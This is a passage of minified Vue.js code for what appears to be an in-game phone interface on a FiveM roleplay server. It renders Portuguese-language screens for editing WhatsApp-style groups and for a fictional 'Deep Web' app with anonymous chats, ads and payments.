    Ym = {
        class: "flex-1 p-5"
    },
    Zm = {
        class: "relative mx-auto w-40"
    },
    Qm = Pl("i", {
        class: "fas fa-link text-white text-xl"
    }, null, -1),
    eh = Pl("label", null, "Nome", -1),
    th = {
        class: "block mt-4"
    },
    nh = {
        class: "border rounded-xl p-4 overflow-y-auto fancy-scroll",
        style: {
            height: "40rem"
        }
    },
    lh = {
        key: 0,
        class: "text-2xl"
    },
    ah = Pl("i", {
        class: "far fa-times text-red-500"
    }, null, -1),
    sh = {
        key: 0,
        class: "text-2xl"
    },
    oh = Pl("i", {
        class: "far fa-user-plus text-blue-500"
    }, null, -1),
    rh = {
        key: 0,
        class: "absolute bottom-8 right-8"
    };
an();
const ih = qm(((e, t, n, l, a, s) => {
    const o = dl("Header"),
        r = dl("app-input");
    return wl(), _l("div", {
        class: ["flex flex-col h-full text-theme", [l.android ? "bg-whatsapp-container" : "bg-theme"]]
    }, [l.android ? (wl(), _l(o, {
        key: 0
    }, {
        default: qm((() => [Pl("div", Gm, [Pl("button", {
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t)),
            class: "absolute left-0 px-4"
        }, [Wm]), Km])])),
        _: 1
    })) : (wl(), _l("div", Jm, [Xm])), Pl("div", Ym, [Pl("div", Zm, [Pl("img", {
        src: l.avatarURL,
        class: "w-40 h-40 rounded-full"
    }, null, 8, ["src"]), Pl("button", {
        onClick: t[2] || (t[2] = e => l.promptAvatarURL()),
        class: ["absolute bottom-0 right-0 w-12 h-12 rounded-full bg-gray-500 border-2 flex flex-center", [l.dark ? "border-black" : "border-white"]]
    }, [Qm], 2)]), Pl("div", null, [eh, Pl(r, {
        modelValue: l.name,
        "onUpdate:modelValue": t[3] || (t[3] = e => l.name = e),
        maxlength: "24",
        class: "text-3xl bg-transparent text-theme border"
    }, null, 8, ["modelValue"])]), Pl("label", th, "Membros (" + g(l.invited.length) + "/100)", 1), Pl("ul", nh, [(wl(!0), _l(bl, null, fa(l.invited, ((t, n) => (wl(), _l("li", {
        key: n,
        class: "flex justify-between items-center mb-2 last:mb-0"
    }, [Pl("span", null, g(e.$filters.getNameByPhone(t)), 1), n ? (wl(), _l("div", lh, [Pl("button", {
        onClick: e => l.removeMember(t),
        class: "pl-3"
    }, [ah], 8, ["onClick"])])) : Ml("", !0)])))), 128)), (wl(!0), _l(bl, null, fa(l.contacts, ((t, n) => (wl(), _l("li", {
        key: n,
        class: "flex justify-between items-center mb-2 last:mb-0"
    }, [Pl("span", null, g(e.$filters.getNameByPhone(t.phone)), 1), l.invited.length < 100 ? (wl(), _l("div", sh, [Pl("button", {
        onClick: e => l.invited.push(t.phone),
        class: "pl-3"
    }, [oh], 8, ["onClick"])])) : Ml("", !0)])))), 128))]), l.invited.length > 1 ? (wl(), _l("div", rh, [Pl("button", {
        onClick: t[4] || (t[4] = (...e) => l.submit && l.submit(...e)),
        class: "bg-blue-500 px-6 p-3 rounded-xl text-white"
    }, "Criar")])) : Ml("", !0)])], 2)
}));
Hm.render = ih, Hm.__scopeId = "data-v-007e0956";
const ch = {
        components: {
            Header: Hp
        },
        setup() {
            jl("setDark")(!!_o.settings.isAndroid || null);
            const e = jl("prompt"),
                t = jl("alert"),
                n = jl("confirm"),
                l = Qi(),
                a = ec(),
                s = Ze({}),
                o = a.params.group.slice(5);
            _o.localhost && (s.id = 1, s.owner = _o.identity.phone, s.isOwner = !0, s.members = ["000-004", "000-002"]);
            const r = da((() => {
                const e = [];
                return s.id && (e.push(s.owner, ...s.members), s.isOwner && e.push(..._o.contacts.value.map((e => e.phone)))), e.filter(((e, t, n) => n.indexOf(e) == t))
            }));
            async function i(e, n) {
                const l = await _o.backend[e](...n);
                return (null == l ? void 0 : l.error) ? (t(l.error), Promise.reject("WhatsApp response with error")) : l
            }
            return _o.backend.wpp_getGroup(o).then((e => {
                e.isOwner = e.owner === _o.identity.phone, Object.assign(s, e), (null == e ? void 0 : e.id) || (l.back(), t("Grupo inválido (Sem ID)"))
            })), i.empty = () => {}, {
                android: _o.settings.isAndroid,
                dark: _o.darkTheme,
                members: r,
                group: s,
                promptAvatarURL: async function() {
                    try {
                        const n = await bo().request(["Link externo", "Galeria"], 20, !0);
                        let l = await (n ? po() : e("Insira o link"));
                        (null == l ? void 0 : l.length) > 255 ? t("Link muito grande, máximo de 255 caracteres") : l && i("wpp_updateGroupAvatar", [s.id, l]).then((() => s.avatarURL = l), i.empty)
                    } catch (n) {}
                },
                updateName: async function(e) {
                    i("wpp_updateGroupName", [s.id, e]).then((() => s.name = e), i.empty)
                },
                removeMember: function(e) {
                    n("Deseja remover " + Bs(e) + "?").then((t => t && i("wpp_removeFromGroup", [s.id, e]).then((() => {
                        s.members = s.members.filter((t => t != e))
                    }), i.empty)))
                },
                leaveGroup: async function() {
                    i("wpp_leaveGroup", [s.id]).then((() => l.go(-2)), i.empty)
                },
                destroyGroup: async function() {
                    i("wpp_deleteGroup", [s.id]).then((() => l.go(-2)), i.empty)
                },
                promoteMember: async function(e) {
                    if (!(await n("Deseja transferir a posse do grupo para " + Bs(e) + "?"))) return;
                    const l = await i("wpp_promote", [s.id, e]);
                    if (null == l ? void 0 : l.error) return t(l.error);
                    const a = s.members.indexOf(e);
                    s.members.splice(a, 1, _o.identity.phone), s.owner = e, s.isOwner = !1
                },
                inviteMember: function(e) {
                    i("wpp_inviteToGroup", [s.id, e]).then((() => s.members.push(e)), i.empty)
                }
            }
        }
    },
    uh = sn("data-v-08fcb553");
ln("data-v-08fcb553");
const dh = {
        class: "flex flex-col h-full bg-whatsapp-container text-theme"
    },
    ph = {
        class: "h-16"
    },
    fh = Pl("i", {
        class: "far fa-arrow-left"
    }, null, -1),
    mh = {
        class: "absolute left-16 font-bold"
    },
    hh = {
        key: 1,
        class: "mt-24 mb-8 px-5"
    },
    bh = Pl("h1", {
        class: "text-5xl font-bold"
    }, "Editar Grupo", -1),
    gh = {
        class: "flex-1 p-5"
    },
    vh = {
        key: 0,
        class: "relative mx-auto w-40"
    },
    xh = Pl("i", {
        class: "fas fa-link text-white text-xl"
    }, null, -1),
    yh = {
        class: "mt-4"
    },
    kh = Pl("label", {
        for: "block m-2"
    }, "Nome do Grupo", -1),
    wh = {
        key: 1,
        class: "mt-4"
    },
    Ch = {
        class: "border rounded-xl p-4 overflow-y-auto fancy-scroll",
        style: {
            height: "40rem"
        }
    },
    _h = {
        key: 0,
        class: "text-2xl"
    },
    Ah = Pl("i", {
        class: "far fa-chevron-up text-green-500"
    }, null, -1),
    Sh = Pl("i", {
        class: "far fa-times text-red-500"
    }, null, -1),
    Rh = Pl("i", {
        class: "far fa-user-plus text-blue-500"
    }, null, -1),
    Th = {
        key: 2,
        class: "absolute bottom-8 left-8"
    },
    Eh = {
        key: 3,
        class: "absolute bottom-8 right-8"
    };
an();
const Ph = uh(((e, t, n, l, a, s) => {
    const o = dl("Header"),
        r = dl("app-input");
    return wl(), _l("div", dh, [l.android ? (wl(), _l(o, {
        key: 0
    }, {
        default: uh((() => {
            var n;
            return [Pl("div", ph, [Pl("button", {
                onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t)),
                class: "absolute left-0 px-4"
            }, [fh]), Pl("h1", mh, g(null == (n = l.group.name) ? void 0 : n.slice(0, 20)), 1)])]
        })),
        _: 1
    })) : (wl(), _l("div", hh, [bh])), Pl("div", gh, [l.group.id ? (wl(), _l("div", vh, [Pl("img", {
        src: l.group.avatarURL,
        class: "w-40 h-40 border rounded-full"
    }, null, 8, ["src"]), l.group.isOwner ? (wl(), _l("button", {
        key: 0,
        onClick: t[2] || (t[2] = e => l.promptAvatarURL()),
        class: ["absolute bottom-0 right-0 w-12 h-12 rounded-full bg-gray-500 border-2 flex flex-center", [l.dark ? "border-black" : "border-white"]]
    }, [xh], 2)) : Ml("", !0)])) : Ml("", !0), Pl("div", yh, [kh, Pl(r, {
        value: l.group.name,
        onChange: t[3] || (t[3] = e => l.updateName(e.target.value)),
        maxlength: "24",
        class: "text-3xl bg-transparent text-theme border"
    }, null, 8, ["value"])]), l.group.members ? (wl(), _l("div", wh, [Pl("label", null, "Membros (" + g(l.group.members.length + 1) + "/100)", 1), Pl("ul", Ch, [(wl(!0), _l(bl, null, fa(l.members, (t => (wl(), _l("li", {
        key: t,
        class: "flex justify-between items-center mb-2 last:mb-0"
    }, [Pl("span", null, g(e.$filters.getNameByPhone(t)), 1), l.group.isOwner && t != l.group.owner ? (wl(), _l("div", _h, [l.group.members.includes(t) ? (wl(), _l("button", {
        key: 0,
        onClick: e => l.promoteMember(t),
        class: "px-3"
    }, [Ah], 8, ["onClick"])) : Ml("", !0), l.group.members.includes(t) ? (wl(), _l("button", {
        key: 1,
        onClick: e => l.removeMember(t),
        class: "pl-3"
    }, [Sh], 8, ["onClick"])) : l.group.members.length < 99 ? (wl(), _l("button", {
        key: 2,
        onClick: e => l.inviteMember(t),
        class: "pl-3"
    }, [Rh], 8, ["onClick"])) : Ml("", !0)])) : Ml("", !0)])))), 128))])])) : Ml("", !0), l.members.length > 1 && !l.group.isOwner ? (wl(), _l("div", Th, [Pl("button", {
        onClick: t[4] || (t[4] = (...e) => l.leaveGroup && l.leaveGroup(...e)),
        class: "text-red-500"
    }, "Sair do grupo")])) : Ml("", !0), l.group.isOwner ? (wl(), _l("div", Eh, [Pl("button", {
        onClick: t[5] || (t[5] = (...e) => l.destroyGroup && l.destroyGroup(...e)),
        class: "text-red-500"
    }, "Excluir o grupo")])) : Ml("", !0)])])
}));
ch.render = Ph, ch.__scopeId = "data-v-08fcb553";
const Lh = {
        props: ["footer", "hasBell"],
        setup() {
            jl("setDark")(!0);
            const e = da((() => _o.settings.isAndroid)),
                t = [{
                    name: "Mensagens",
                    path: "/tor",
                    icon: "fal fa-reply-all"
                }, {
                    name: "Grupos",
                    path: "/tor/groups",
                    icon: "fal fa-comment-alt"
                }, {
                    name: "Anúncios",
                    path: "/tor/store",
                    icon: "fal fa-bags-shopping"
                }];
            _o.isDisabled("tor-payments") || t.push({
                name: "Pagamentos",
                path: "/tor/payments",
                icon: "fal fa-wallet"
            });
            const n = rt(_o.hasNotificationFor("tor"));
            return Rn(n, (e => _o.setNotificationFor("tor", e))), {
                isAndroid: e,
                routes: t,
                notifications: n
            }
        }
    },
    Ih = {
        class: "flex flex-col h-full bg-black"
    },
    Oh = {
        class: "h-32 pt-16 bg-tor-secondary text-white flex-shrink-0"
    },
    Mh = {
        key: 0,
        class: "far fa-arrow-left mr-4"
    },
    Vh = {
        key: 1,
        class: "fas fa-chevron-left text-blue-400"
    },
    Dh = {
        class: "font-bold ml-16"
    },
    Uh = {
        key: 0,
        class: "far fa-bell"
    },
    Nh = {
        key: 1,
        class: "far fa-bell-slash"
    },
    $h = {
        class: "flex-1 overflow-y-auto hide-scroll"
    },
    jh = {
        key: 0,
        class: "h-32 bg-tor-secondary flex justify-between items-center px-8 text-white text-4xl"
    },
    Fh = {
        class: "text-lg mt-3"
    };
Lh.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", Ih, [Pl("div", Oh, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-16 px-5"
    }, [l.isAndroid ? (wl(), _l("i", Mh)) : (wl(), _l("i", Vh))]), Pl("h1", Dh, [Zt(e.$slots, "header"), n.hasBell ? (wl(), _l("button", {
        key: 0,
        onClick: t[2] || (t[2] = e => l.notifications = !l.notifications),
        class: "absolute top-20 right-8 w-6 h-4 flex flex-center"
    }, [l.notifications ? (wl(), _l("i", Uh)) : (wl(), _l("i", Nh))])) : Ml("", !0)])]), Pl("div", $h, [Zt(e.$slots, "default")]), Zt(e.$slots, "footer"), !1 !== n.footer ? (wl(), _l("div", jh, [(wl(!0), _l(bl, null, fa(l.routes, (t => (wl(), _l("button", {
        key: t.path,
        class: ["text-center", {
            "text-tor": e.$route.path == t.path
        }],
        onClick: n => e.$router.replace(t.path)
    }, [Pl("i", {
        class: t.icon
    }, null, 2), Pl("h1", Fh, g(t.name), 1)], 10, ["onClick"])))), 128))])) : Ml("", !0)])
};
const zh = Ze({
    id: "0",
    is(e) {
        return this.id == e || this.id == (null == e ? void 0 : e.sender)
    },
    getNickname(e) {
        var t;
        return null != (t = localStorage.getItem("tor:nickname:" + e)) ? t : "Usuário " + e
    },
    setNickname(e, t) {
        localStorage.setItem("tor:nickname:" + e, t)
    },
    direct: [],
    groups: ["geral"],
    listening: []
});
for (let sM of ["direct", "groups", "listening"]) {
    const e = "smartphone@deepweb@" + sM,
        t = localStorage.getItem(e);
    if (t) {
        const e = JSON.parse(t);
        zh[sM] = e
    }
    Rn((() => zh[sM]), (t => {
        localStorage.setItem(e, JSON.stringify(t))
    }), {
        deep: !0
    })
}
An((() => _o.backend.tor_subscribe(zh.groups))), _o.pusher.on("TOR_MESSAGE", (e => {
    const t = String(e.sender);
    t != zh.id && e.channel.startsWith("dm:") && !zh.direct.includes(t) && zh.direct.unshift(t)
}));
const Bh = {
        components: {
            Page: Lh
        },
        setup() {
            const e = Qi(),
                t = rt([]);
            return _o.backend.tor_blocked().then((t => {
                t && (e.replace("/home"), _o.alert(t))
            })), _o.backend.tor_resume(zh.direct).then((e => {
                t.value = Object.entries(e).map((([e, t]) => ({
                    id: e,
                    name: zh.getNickname(e),
                    avatarURL: `https://avatars.dicebear.com/api/identicon/${e}.svg`,
                    message: t
                }))).sort(((e, t) => e.message && t.message ? e.message.created_at > t.message.created_at ? -1 : 1 : e.message == t.message ? 0 : e.message ? -1 : 1))
            })), _o.onceRoute("TOR_MESSAGE", (e => {
                if (e.channel.startsWith("dm:") && e.sender != zh.id) {
                    const n = t.value.find((t => t.id == e.sender));
                    n && (n.message = e)
                }
            })), _o.backend.tor_id().then((e => zh.id = e)), {
                users: t,
                search: function() {
                    _o.prompt("Digite o id do usuário").then((t => {
                        (t = null == t ? void 0 : t.trim()) && (t.match(/^\d+$/) ? e.push("/tor/" + t) : _o.alert("Usuário inválido"))
                    }))
                }
            }
        }
    },
    Hh = Il(" Deep Web "),
    qh = {
        class: "text-2xl flex-1"
    },
    Gh = {
        class: "flex justify-between"
    },
    Wh = {
        class: "font-bold"
    },
    Kh = {
        key: 0,
        class: "text-lg"
    },
    Jh = {
        key: 0,
        class: "text-gray-400"
    },
    Xh = {
        key: 0
    },
    Yh = {
        key: 1
    },
    Zh = {
        key: 2
    },
    Qh = {
        key: 1,
        class: "text-gray-400 italic"
    },
    eb = Pl("i", {
        class: "fa fa-pen"
    }, null, -1);
Bh.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, {
        hasBell: "yes"
    }, {
        header: en((() => [Hh])),
        default: en((() => [Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.users, (t => (wl(), _l("li", {
            key: t.id,
            onClick: n => e.$router.push("/tor/" + t.id),
            class: "p-5 flex items-start text-white hover:bg-gray-900"
        }, [Pl("img", {
            class: "bg-white rounded-full w-20 mr-4",
            src: t.avatarURL
        }, null, 8, ["src"]), Pl("div", qh, [Pl("div", Gh, [Pl("h1", Wh, g(t.name), 1), t.message ? (wl(), _l("h1", Kh, g(e.$filters.unixToRelative(t.message.created_at)), 1)) : Ml("", !0)]), t.message ? (wl(), _l("p", Jh, [t.message.location ? (wl(), _l("span", Xh, "🌎 Localização")) : t.message.image ? (wl(), _l("span", Yh, "📷 Foto")) : (wl(), _l("span", Zh, g(t.message.content), 1))])) : (wl(), _l("p", Qh, "Nenhuma mensagem..."))])], 8, ["onClick"])))), 128))]), Pl("button", {
            onClick: t[1] || (t[1] = (...e) => l.search && l.search(...e)),
            class: "absolute bottom-40 right-8 w-24 h-24 bg-tor text-white rounded-full"
        }, [eb])])),
        _: 1
    })
};
const tb = {
        components: {
            Page: Lh
        },
        setup() {
            const e = Qi(),
                t = rt([]);
            return _o.backend.tor_resume(zh.groups, !0).then((e => {
                t.value = Object.entries(e).map((([e, t]) => ({
                    id: e,
                    message: t
                }))).sort(((e, t) => e.message && t.message ? e.message.created_at > t.message.created_at ? -1 : 1 : e.message == t.message ? 0 : e.message ? -1 : 1))
            })), _o.onceRoute("TOR_MESSAGE", (e => {
                if (!e.channel.startsWith("dm:") && e.sender != zh.id) {
                    const n = t.value.find((t => t.id == e.channel));
                    n && (n.message = e)
                }
            })), {
                state: zh,
                groups: t,
                search: function() {
                    _o.prompt("Digite o nome do grupo").then((t => {
                        (t = null == t ? void 0 : t.trim()) && (t.match(/^[\w-.]+$/) ? e.push("/tor/" + t) : _o.alert("Grupo inválido"))
                    }))
                }
            }
        }
    },
    nb = Il(" Deep Web "),
    lb = Pl("div", {
        class: "bg-white rounded-full w-20 h-20 mr-4 flex flex-center"
    }, [Pl("i", {
        class: "fas fa-users text-4xl text-gray-500"
    })], -1),
    ab = {
        class: "text-2xl flex-1"
    },
    sb = {
        class: "flex justify-between"
    },
    ob = {
        class: "font-bold"
    },
    rb = {
        key: 0,
        class: "text-lg"
    },
    ib = {
        key: 0,
        class: "text-gray-400"
    },
    cb = {
        key: 0
    },
    ub = {
        key: 1
    },
    db = {
        key: 2
    },
    pb = {
        key: 1,
        class: "text-gray-400 italic"
    },
    fb = Pl("i", {
        class: "fa fa-search"
    }, null, -1);
tb.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, {
        hasBell: "yes"
    }, {
        header: en((() => [nb])),
        default: en((() => [Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.groups, (t => (wl(), _l("li", {
            key: t,
            onClick: n => e.$router.push("/tor/" + t.id),
            class: "p-5 flex items-start text-white hover:bg-gray-900"
        }, [lb, Pl("div", ab, [Pl("div", sb, [Pl("h1", ob, "#" + g(t.id), 1), t.message ? (wl(), _l("h1", rb, g(e.$filters.unixToRelative(t.message.created_at)), 1)) : Ml("", !0)]), t.message ? (wl(), _l("p", ib, [t.message.location ? (wl(), _l("span", cb, "🌎 Localização")) : t.message.image ? (wl(), _l("span", ub, "📷 Foto")) : (wl(), _l("span", db, g(t.message.content), 1))])) : (wl(), _l("p", pb, "Nenhuma mensagem..."))])], 8, ["onClick"])))), 128))]), Pl("button", {
            onClick: t[1] || (t[1] = (...e) => l.search && l.search(...e)),
            class: "absolute bottom-40 right-8 w-24 h-24 bg-tor text-white rounded-full"
        }, [fb])])),
        _: 1
    })
};
const mb = {
        components: {
            Page: Lh
        },
        setup() {
            const e = ec(),
                t = da((() => e.params.id)),
                n = !t.value.match(/^\d+$/),
                l = rt(n ? "#" + t.value : zh.getNickname(t.value));
            const a = da((() => n ? zh.groups.includes(t.value) : zh.direct.includes(t.value)));
            const s = e.params.id,
                o = rt(""),
                r = rt([]),
                i = da((() => {
                    const e = [];
                    let t;
                    for (let n of r.value)(null == t ? void 0 : t[0].sender) != n.sender ? e.push(t = [n]) : t.push(n);
                    return e
                }));

            function c(e) {
                var t;
                !0 !== e && o.value || null == (t = document.querySelector(".overflow-y-auto")) || t.scrollTo({
                    top: 9e6,
                    behavior: e ? "auto" : "smooth"
                })
            }
            async function u(e, t) {
                (e || t || o.value) && (_o.backend.tor_send(n ? s : parseInt(s), o.value, e, t), o.value = "")
            }
            return _o.backend.tor_messages(n ? s : parseInt(s)).then((e => {
                for (let n of e) try {
                    const e = JSON.parse(n.content);
                    3 === e.length && (n.location = e, n.content = "")
                } catch (t) {}
                r.value = e, Lt((() => c(!0)))
            })).catch((e => console.error(e))), _o.onceRoute("TOR_MESSAGE", (e => {
                r.value.find((t => t.id == e.id)) || n && e.channel != t.value || (n || e.sender == t.value || e.sender == zh.id) && (r.value.push(e), Lt(c))
            })), {
                state: zh,
                input: o,
                messages: r,
                addMessage: u,
                blocks: i,
                addAttachment: async function() {
                    const e = ["camera", "gallery", "location"];
                    _o.settings.allowUnsafeURL && e.splice(2, 0, "image"), n || _o.isDisabled("tor-payments") || e.push("payment");
                    const l = await bo().request([
                        ["Câmera", "text-blue-500 text-center"],
                        ["Galeria", "text-blue-500 text-center"], e.includes("image") && ["Imagem", "text-blue-500 text-center"],
                        ["Localização", "text-blue-500 text-center"], e.includes("payment") && ["Pagamento", "text-blue-500 text-center"]
                    ], 7 * e.length);
                    try {
                        switch (e[l]) {
                            case "camera":
                                return u(await io(!1, "/tor"));
                            case "gallery":
                                return u(await po());
                            case "image":
                                return u(await _o.promptImageURL());
                            case "location":
                                const e = await _o.getPlayerCoords();
                                return u(null, JSON.stringify(e));
                            case "payment":
                                const n = parseInt(await _o.prompt("Insira o valor"));
                                n > 0 && _o.lockAndProceed((() => _o.backend.tor_pay(parseInt(t.value), n).then((e => {
                                    _o.alert(null == e ? void 0 : e.error)
                                }))))
                        }
                    } catch (a) {}
                },
                setLocation: function(e) {
                    _o.pusher.emit("GPS", {
                        location: e
                    })
                },
                ajustSize: c,
                isPinned: a,
                togglePinned: function() {
                    const e = n ? zh.groups : zh.direct,
                        l = e.indexOf(t.value);
                    l >= 0 ? e.splice(l, 1) : e.push(t.value)
                },
                isGroup: n,
                nickname: l,
                changeNickname: function() {
                    _o.prompt("Insira o apelido", 12).then((e => {
                        const n = null == e ? void 0 : e.trim();
                        n && n.length <= 12 && (zh.setNickname(t.value, n), l.value = n)
                    }))
                }
            }
        }
    },
    hb = sn("data-v-c6a631a6");
ln("data-v-c6a631a6");
const bb = {
        class: "flex items-center"
    },
    gb = {
        key: 0,
        class: "bg-white rounded-full w-12 h-12 mr-4 flex flex-center"
    },
    vb = Pl("i", {
        class: "fas fa-users text-2xl text-gray-500"
    }, null, -1),
    xb = {
        class: "ml-auto"
    },
    yb = Pl("i", {
        class: "fas fa-user-tag"
    }, null, -1),
    kb = {
        key: 0,
        class: "fal fa-times"
    },
    wb = {
        key: 1,
        class: "fas fa-thumbtack transform rotate-45"
    },
    Cb = {
        key: 0,
        class: "text-white text-base"
    },
    _b = {
        class: "break-words relative mt-1"
    },
    Ab = {
        class: "mr-2"
    },
    Sb = {
        class: "text-base h-6 float-right relative top-3"
    },
    Rb = {
        class: "h-20 px-4 flex items-center bg-tor-secondary"
    },
    Tb = Pl("i", {
        class: "far fa-paper-plane"
    }, null, -1),
    Eb = Pl("i", {
        class: "far fa-paperclip transform rotate-180"
    }, null, -1);
an();
const Pb = hb(((e, t, n, l, a, s) => {
    const o = dl("Page");
    return wl(), _l(o, {
        footer: !1
    }, {
        header: hb((() => [Pl("div", bb, [l.isGroup ? (wl(), _l("div", gb, [vb])) : (wl(), _l("img", {
            key: 1,
            class: "w-12 h-12 bg-white rounded-full mr-4",
            src: `https://avatars.dicebear.com/api/identicon/${e.$route.params.id}.svg`
        }, null, 8, ["src"])), Pl("h1", null, g(l.nickname), 1), Pl("div", xb, [l.isGroup ? Ml("", !0) : (wl(), _l("button", {
            key: 0,
            class: "mr-2 px-2",
            onClick: t[1] || (t[1] = (...e) => l.changeNickname && l.changeNickname(...e))
        }, [yb])), Pl("button", {
            class: "mr-4 px-2",
            onClick: t[2] || (t[2] = (...e) => l.togglePinned && l.togglePinned(...e))
        }, [l.isPinned ? (wl(), _l("i", kb)) : (wl(), _l("i", wb))])])])])),
        footer: hb((() => [Pl("div", Rb, [Zn(Pl("input", {
            "onUpdate:modelValue": t[5] || (t[5] = e => l.input = e),
            onKeydown: t[6] || (t[6] = us((e => l.addMessage()), ["enter"])),
            class: "ml-8 flex-1 caret-tor text-white text-3xl bg-transparent",
            placeholder: "Mensagem"
        }, null, 544), [
            [ns, l.input, void 0, {
                trim: !0
            }]
        ]), l.input ? (wl(), _l("button", {
            key: 0,
            onClick: t[7] || (t[7] = e => l.addMessage()),
            class: "p-4 text-gray-500"
        }, [Tb])) : (wl(), _l("button", {
            key: 1,
            onClick: t[8] || (t[8] = (...e) => l.addAttachment && l.addAttachment(...e)),
            class: "p-4 text-gray-500"
        }, [Eb]))])])),
        default: hb((() => [(wl(!0), _l(bl, null, fa(l.blocks, ((n, a) => (wl(), _l("ul", {
            key: a,
            class: "p-4"
        }, [Pl("li", {
            class: ["flex", {
                "flex-row-reverse": n[0].sender == l.state.id
            }]
        }, [l.state.is(n[0]) ? Ml("", !0) : (wl(), _l("img", {
            key: 0,
            class: "w-16 h-16 bg-white rounded-full",
            src: `https://avatars.dicebear.com/api/identicon/${n[0].sender}.svg`
        }, null, 8, ["src"])), Pl("ul", {
            class: ["flex flex-col items-start w-full", n[0].sender == l.state.id ? "mr-4" : "ml-4"]
        }, [!l.state.is(n[0]) && l.isGroup ? (wl(), _l("li", Cb, [Pl("button", {
            onClick: t => e.$router.push("/tor/" + n[0].sender)
        }, "Usuário " + g(n[0].sender), 9, ["onClick"])])) : Ml("", !0), (wl(!0), _l(bl, null, fa(n, (n => {
            var a;
            return wl(), _l("li", {
                key: n.id,
                class: ["message p-2 rounded text-3xl text-white mb-1.5", [n.sender == l.state.id ? "ml-auto bg-tor" : "bg-gray-800"]]
            }, [n.image ? (wl(), _l("img", {
                key: 0,
                class: "w-full rounded",
                onLoad: t[3] || (t[3] = (...e) => l.ajustSize && l.ajustSize(...e)),
                src: n.image
            }, null, 40, ["src"])) : n.location ? (wl(), _l("img", {
                key: 1,
                onClick: e => l.setLocation(n.location),
                class: "w-full rounded",
                onLoad: t[4] || (t[4] = (...e) => l.ajustSize && l.ajustSize(...e)),
                src: "https://fivem.jesteriruka.dev/stock/maps.jpg"
            }, null, 40, ["onClick"])) : Ml("", !0), Pl("p", _b, [Pl("span", Ab, g(n.content), 1), Pl("span", Sb, g(e.$filters.unixToHHMM(null != (a = n.created_at) ? a : Date.now())), 1)])], 2)
        })), 128))], 2)], 2)])))), 128))])),
        _: 1
    })
}));
mb.render = Pb, mb.__scopeId = "data-v-c6a631a6";
const Lb = {
        components: {
            Page: Lh
        },
        setup() {
            const e = Qi(),
                t = rt([]),
                n = da((() => _o.identity.moderator)),
                l = jl("useImageFocus");
            return _o.backend.tor_ads().then((e => t.value = e)), {
                state: zh,
                create: function() {
                    e.push("/tor/store/create")
                },
                ads: t,
                focusImage: l,
                destroy: function(e) {
                    _o.backend.tor_destroy_ad(e).then((() => {
                        t.value = t.value.filter((t => t.id != e))
                    }))
                },
                moderator: n
            }
        }
    },
    Ib = Il(" Deep Web "),
    Ob = {
        class: "p-4"
    },
    Mb = {
        class: "bg-gray-800 rounded flex-1 p-3"
    },
    Vb = {
        class: "flex justify-between items-start mb-4"
    },
    Db = {
        class: "font-bold break-words mr-2"
    },
    Ub = Pl("i", {
        class: "fal fa-times text-red-500"
    }, null, -1),
    Nb = {
        class: "text-xl mb-4"
    },
    $b = {
        class: "text-lg"
    },
    jb = Pl("i", {
        class: "fas fa-reply"
    }, null, -1),
    Fb = Il(" Conversar"),
    zb = Pl("i", {
        class: "far fa-plus"
    }, null, -1);
Lb.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, null, {
        header: en((() => [Ib])),
        default: en((() => [Pl("ul", Ob, [(wl(!0), _l(bl, null, fa(l.ads, (t => (wl(), _l("li", {
            key: t.id,
            class: "flex text-white text-2xl mb-6"
        }, [Pl("img", {
            class: "w-20 h-20 rounded-full bg-white mr-4",
            src: `https://avatars.dicebear.com/api/identicon/${t.anom_id}.svg`,
            alt: ""
        }, null, 8, ["src"]), Pl("div", Mb, [Pl("div", Vb, [Pl("h1", Db, g(t.title), 1), l.moderator || l.state.id == t.anom_id ? (wl(), _l("button", {
            key: 0,
            onClick: e => l.destroy(t.id)
        }, [Ub], 8, ["onClick"])) : Ml("", !0)]), Pl("p", Nb, g(t.description), 1), t.image ? (wl(), _l("img", {
            key: 0,
            class: "h-64 mb-4 mx-auto",
            onClick: e => l.focusImage(t.image),
            src: t.image
        }, null, 8, ["onClick", "src"])) : Ml("", !0), Pl("p", $b, "Autor: " + g(t.anom_id), 1), Pl("button", {
            onClick: n => e.$router.push(`/tor/${t.anom_id}`),
            class: "font-bold"
        }, [jb, Fb], 8, ["onClick"])])])))), 128))]), Pl("button", {
            onClick: t[1] || (t[1] = (...e) => l.create && l.create(...e)),
            class: "absolute bottom-40 right-8 w-24 h-24 bg-tor text-white rounded-full"
        }, [zb])])),
        _: 1
    })
};
const Bb = Ze({}),
    Hb = {
        components: {
            Page: Lh
        },
        setup() {
            const e = Qi();
            return {
                state: zh,
                form: Bb,
                addImage: async function() {
                    try {
                        const e = await bo().request([
                            ["Câmera", "text-center"],
                            ["Galeria", "text-center"]
                        ], 20, !0);
                        Bb.image = e ? await po() : await io(!1, "/tor")
                    } catch (e) {}
                },
                publish: function() {
                    Bb.title && Bb.description && (_o.backend.tor_publish(Bb).then((() => e.back())), Object.assign(Bb, {
                        title: "",
                        description: "",
                        image: ""
                    }))
                }
            }
        }
    },
    qb = sn("data-v-a969c978");
ln("data-v-a969c978");
const Gb = Il(" Deep Web "),
    Wb = {
        class: "p-5 text-xl text-white"
    },
    Kb = Pl("h1", null, "Título", -1),
    Jb = Pl("h1", null, "Descrição", -1),
    Xb = Pl("h1", null, "Foto (Opcional)", -1),
    Yb = {
        class: "text-right mt-4"
    };
an();
const Zb = qb(((e, t, n, l, a, s) => {
    const o = dl("Page");
    return wl(), _l(o, {
        footer: !1
    }, {
        header: qb((() => [Gb])),
        default: qb((() => [Pl("div", Wb, [Kb, Zn(Pl("input", {
            "onUpdate:modelValue": t[1] || (t[1] = e => l.form.title = e),
            tabindex: "1"
        }, null, 512), [
            [ns, l.form.title, void 0, {
                trim: !0
            }]
        ]), Jb, Zn(Pl("input", {
            "onUpdate:modelValue": t[2] || (t[2] = e => l.form.description = e),
            tabindex: "1"
        }, null, 512), [
            [ns, l.form.description, void 0, {
                trim: !0
            }]
        ]), Xb, l.form.image ? (wl(), _l("img", {
            key: 0,
            class: "h-64 rounded mx-auto mt-4",
            src: l.form.image
        }, null, 8, ["src"])) : (wl(), _l("button", {
            key: 1,
